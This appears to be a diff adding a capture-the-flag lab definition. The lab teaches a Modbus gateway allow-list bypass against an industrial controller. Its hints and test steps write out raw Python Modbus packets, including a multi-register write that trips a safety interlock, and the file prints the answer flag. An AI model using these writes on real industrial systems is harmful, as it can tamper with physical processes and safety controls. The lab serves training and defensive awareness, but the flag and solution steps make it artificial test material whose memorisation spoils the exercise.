@@ -1,0 +1,112 @@
+title: Halcyon Industrial - Modbus Gateway Bypass
+category: ot
+difficulty: intermediate
+estimated_time: 50
+prerequisites:
+  - ot-1-2-modbus-setpoint-tampering
+# By completion students will be able to:
+learning_outcomes:
+  - Explain how a Modbus gateway segments the control network
+  - Identify which write function codes a gateway filters
+  - Bypass a single-register allow-list with a multi-register write
+  - Recommend a write filter that covers every write function code
+mapped_skills:
+  - ot_ics
+assessment_criteria:
+  - Submit the correct flag.
+  - Pass every automated test step in the lab manifest.
+mitre_attack:
+  - tactic: Impair Process Control
+    technique: T0855
+    technique_name: Unauthorized Command Message
+    detection: Inspect every Modbus write function code (0x05, 0x06, 0x0F, 0x10, 0x17) at the gateway, not only single-register writes.
+
+owner: "OpenCyberRange Curriculum"
+content_version: "2.5.3"
+reviewed_at: "2026-11-15"
+review_status: "automated static proof; live walkthrough pending"
+description: "A Modbus gateway protects the controller with a write allow-list. Confirm the PLC is segmented, find the write the gateway fails to inspect, and recover the marker the interlock exposes."
+visibility: public
+flag: "OCR{m0dbu5_g4t3w4y_byp455}"
+
+tools:
+  - python3
+  - nmap
+  - mbpoll
+
+scenario: |
+  After the setpoint incident, Halcyon Industrial placed a Modbus gateway in
+  front of the HIC-2400 controller. The gateway is now the only reachable
+  device: it proxies reads to the PLC and permits single-register writes only
+  to the batch counter block (holding registers 20-29).
+
+  The engineering team says the controller is protected because the setpoint
+  register is no longer writable. Prove them wrong. Find a write path the
+  allow-list does not inspect, trip the safety interlock, and recover the
+  maintenance marker.
+
+troubleshooting: "If the gateway refuses a write, capture the exception code: 0x02 means the gateway rejected the address. If the PLC hostname does not resolve, that is expected: only the gateway sits on the lab network. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
+defensive_takeaways: "A Modbus gateway must inspect every write function code, including 0x0F (coils), 0x10 (multiple registers), and 0x17 (read/write multiple). Filter by register range on the decoded PDU, not by a single opcode. Log rejected and permitted writes, and alert on writes outside the operating envelope."
+difficulty_evidence: "Static student-tester walkthrough of the workbook and lab definition; live lab run not recorded; declared difficulty 'intermediate' as provisional."
+difficulty_evidence_source: "reviewer_walkthrough"
+difficulty_evidence_sample: 1
+difficulty_evidence_quality: "provisional"
+difficulty_evidence_reviewed_at: "2026-11-15"
+workbook: "wiki/range/ot/CH_OT01_Modbus_Fundamentals/03_Modbus_Gateway_Bypass/"
+
+hostnames:
+  - ip_offset: "60"
+    hostname: "gateway"
+    description: "Halcyon Modbus gateway (the only reachable device)"
+
+topology:
+  nodes:
+    - id: "gateway"
+      label: "Modbus gateway"
+      type: "server"
+      ip_offset: "60"
+      ports: [502]
+      services: ["modbus-gateway"]
+      x: 1
+      y: 1
+
+hints:
+  - text: |
+      Start with discovery. Only one host answers on the lab subnet:
+      nmap -sV -p 502 <gateway_ip>
+      The PLC name does not resolve from the lab network by design.
+    unlock_after_minutes: 5
+  - text: |
+      Read the setpoint through the gateway:
+      mbpoll -m tcp -p 502 -t 4 -r 10 -c 4 <gateway_ip>
+      Then try a single-register write to register 10. The gateway returns
+      exception code 0x02 (illegal data address).
+    unlock_after_minutes: 12
+  - text: |
+      The allow-list checks function code 0x06 only. Modbus also has a
+      multi-register write, function code 0x10, which carries an address and a
+      byte count. Write the setpoint with that opcode instead, then read the
+      marker from register 40.
+    unlock_after_minutes: 20
+
+test:
+  steps:
+    - name: "Gateway is reachable"
+      command: "python3 -c \"import socket;s=socket.create_connection(('{target.gateway}',502),5);s.close();print('ok')\""
+      expect: "ok"
+      timeout: 20
+
+    - name: "Reads pass through the gateway"
+      command: "python3 -c \"import socket,struct;s=socket.create_connection(('{target.gateway}',502),5);s.sendall(struct.pack('>HHHBBHH',1,0,6,1,3,10,3));r=s.recv(64);print(struct.unpack('>H',r[9:11])[0])\""
+      expect: "20"
+      timeout: 20
+
+    - name: "Single-register setpoint write is blocked"
+      command: "python3 -c \"import socket,struct;s=socket.create_connection(('{target.gateway}',502),5);s.sendall(struct.pack('>HHHBBHH',1,0,6,1,6,10,250));r=s.recv(64);print('blocked' if r[7]==0x86 and r[8]==2 else 'allowed')\""
+      expect: "blocked"
+      timeout: 20
+
+    - name: "Multi-register write bypasses the allow-list"
+      command: "python3 -c \"import socket,struct,time;s=socket.create_connection(('{target.gateway}',502),5);s.sendall(struct.pack('>HHHBBHHBH',1,0,9,1,16,10,1,2,250));s.recv(64);time.sleep(3);s.sendall(struct.pack('>HHHBBHH',2,0,6,1,3,40,40));r=s.recv(256);bc=r[8];vals=struct.unpack('>%dH'%(bc//2),r[9:9+bc]);out=''.join(chr(v) for v in vals if 32<=v<127);print(out.split(chr(0))[0])\""
+      expect: "OCR{m0dbu5_g4t3w4y_byp455}"
+      timeout: 30
